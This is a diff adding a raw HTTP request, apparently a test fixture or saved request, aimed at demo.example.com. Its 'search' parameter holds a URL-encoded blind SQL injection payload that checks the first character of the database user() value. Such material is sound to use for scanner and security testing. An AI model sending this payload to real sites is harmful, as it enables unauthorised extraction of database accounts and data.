@@ -1,0 +1,4 @@
+GET /a?search=1%27%2Band%2Bascii%28substring%28user%28%29%2C1%2C1%29%29%3E64%23 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
